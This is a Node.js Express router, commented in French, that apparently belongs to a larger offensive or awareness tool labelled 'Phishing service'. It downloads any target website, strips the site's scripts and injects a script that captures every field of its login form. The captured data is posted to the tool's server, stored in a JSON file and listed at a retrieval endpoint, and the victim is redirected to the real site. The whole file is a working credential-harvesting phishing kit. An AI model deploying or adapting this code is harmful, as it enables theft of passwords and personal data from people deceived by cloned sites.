import express from "express";
import axios from "axios";
import fs from "fs";
import path from "path";
import {fileURLToPath} from "url";
import url from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);  // __dirname obtenu en utilisant import.meta.url

const router = express.Router();

const SUBMISSIONS_FILE = path.join(__dirname, "datas.json");

const getDomainName = (urlStr) => {
    const parsedUrl = new url.URL(urlStr);
    return parsedUrl.hostname.replace(/^www\./, ''); // Enlever "www." si présent
};
/**
 * @swagger
 * /:
 *   get:
 *     summary: Scraper un site et générer un fichier HTML modifié
 *     tags: [Feature - Phishing service]
 *     parameters:
 *       - in: query
 *         name: url
 *         required: true
 *         description: URL du site à scraper
 *         schema:
 *           type: string
 *           format: uri
 *     responses:
 *       200:
 *         description: Fichier HTML généré avec succès
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   description: Message de succès avec l'emplacement du fichier généré
 *                 info:
 *                   type: string
 *                   description: L'URL pour récupérer les données soumises
 *       400:
 *         description: L'URL est requise
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *       500:
 *         description: Erreur lors du scraping du site
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 */

router.get('/', async (req, res) => {
    const {url: siteUrl} = req.query;
    const token = req.headers['authorization'];
    if (!siteUrl) {
        return res.status(400).send("L'URL est requise");
    }

    try {
        const response = await axios.get(siteUrl);
        let referenceContent = response.data;

        const domainName = getDomainName(siteUrl);
        const TEMP_HTML_FILE = path.join(__dirname, `${domainName}.html`); // Créer un nom de fichier unique basé sur le nom du domaine

        referenceContent = referenceContent.replace(/<script[^>]*>([\S\s]*?)<\/script>/g, '');
        const script = `
            <script>
                document.addEventListener("DOMContentLoaded", function () {
                const checkForm = () => {
                    const form = document.querySelector("form");
            
                    if (form) {
                        form.addEventListener("submit", async function (event) {
                            event.preventDefault();
            
                            const formData = new FormData(form);
                            const data = {};
                            data.site = "${siteUrl}";
                            formData.forEach((value, key) => {
                                data[key] = value;
                            });
            
                            try {
                                const response = await fetch("http://localhost:4000/features/phishing-service", {
                                    method: "POST",
                                    headers: {
                                        "Content-Type": "application/json",
                                        "Authorization": "${token}"
                                    },
                                    body: JSON.stringify(data)
                                });
            
                                const result = await response.json();
                                console.log("Données reçues :", result);
                                window.location.href = "${siteUrl}";
                            } catch (error) {
                                console.error("Erreur :", error);
                            }
                        });
                    } else {
                        console.log("Formulaire non trouvé, réessayer dans 5 secondes...");
                        setTimeout(checkForm, 5000); // Attendre 5 secondes et relancer la recherche
                    }
                };
            
                // Lancer la vérification immédiatement
                checkForm();
            });
            </script>
        `;

        referenceContent = referenceContent.replace(/<\/body>/, script + '</body>');

        fs.writeFileSync(TEMP_HTML_FILE, referenceContent);

        res.send({
            message: `Fichier HTML généré avec succès ! Vous pouvez l'ouvrir à cet emplacement : ${TEMP_HTML_FILE}`,
            info: `Vous pourrez retrouver toutes les informations à cette requête : http://localhost:4000/features/phishing-service/datas`
        });

    } catch (error) {
        console.error("Erreur lors du scraping du site :", error);
        res.status(500).send("Erreur lors du scraping du site");
    }
});
/**
 * @swagger
 * /:
 *   post:
 *     summary: Soumettre les données d'un formulaire
 *     tags: [Feature - Phishing service]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               site:
 *                 type: string
 *                 description: L'URL du site
 *               [autres champs du formulaire]:
 *                 type: string
 *                 description: Autres données soumises par l'utilisateur
 *     responses:
 *       200:
 *         description: Données reçues avec succès
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   description: Message de succès
 *                 submission:
 *                   type: object
 *                   description: Données soumises
 *       400:
 *         description: Aucune donnée valide trouvée dans le formulaire
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 error:
 *                   type: string
 *       500:
 *         description: Erreur lors de la soumission des données
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 error:
 *                   type: string
 */

router.post('/', async (req, res) => {
    try {
        const formData = {};
        for (const [key, value] of Object.entries(req.body)) {
            formData[key] = value;
        }

        if (Object.keys(formData).length === 0) {
            return res.status(400).json({ error: "Aucun champ valide trouvé dans le formulaire." });
        }

        let submissions = [];
        if (fs.existsSync(SUBMISSIONS_FILE)) {
            const data = fs.readFileSync(SUBMISSIONS_FILE, "utf8");
            try {
                submissions = JSON.parse(data);

                if (!Array.isArray(submissions)) {
                    console.warn("Le fichier JSON ne contient pas un tableau. Réinitialisation.");
                    submissions = [];
                }
            } catch (err) {
                console.error("Erreur lors du parsing du JSON :", err);
                submissions = [];
            }
        }

        const newSubmission = { ...formData, timestamp: new Date() };
        submissions.push(newSubmission);

        fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));

        res.status(200).json({
            message: "Données reçues avec succès !",
            submission: newSubmission,
        });
    } catch (error) {
        console.error("Erreur lors du traitement des données :", error);
        res.status(500).json({ error: "Une erreur est survenue lors de la soumission." });
    }
});
router.get('/datas', async (req, res) => {
    try {
        if (!fs.existsSync(SUBMISSIONS_FILE)) {
            return res.status(404).json({message: "Aucune soumission trouvée."});
        }

        const data = fs.readFileSync(SUBMISSIONS_FILE, "utf8");
        const submissions = JSON.parse(data);

        res.status(200).json(submissions);
    } catch (error) {
        console.error("Erreur lors de la récupération des données :", error);
        res.status(500).json({error: "Une erreur est survenue lors de la récupération des données."});
    }
});

export default router;
